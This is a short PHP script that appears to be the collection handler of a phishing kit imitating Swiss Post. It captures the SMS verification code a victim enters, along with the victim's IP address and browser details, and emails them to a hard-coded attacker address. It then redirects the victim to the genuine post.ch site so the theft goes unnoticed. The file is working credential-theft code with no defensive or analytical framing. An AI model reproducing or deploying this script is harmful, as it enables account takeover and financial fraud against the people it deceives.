<?php
$zabi = getenv("REMOTE_ADDR");
$message .= "--++-----[ Swiss SMS]-----++--\n";
$message .= "-------------- BY Adem -----\n";
$message .= "SMS : ".$_POST['sms']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "----------------------By Adem ----------------------\n";
$subject = "Swiss SMS [ " . $zabi . " ]  ";
$email = "ahriche123@yandex.com";
mail($email,$subject,$message);
    

header("Location: https://www.post.ch/en");
?>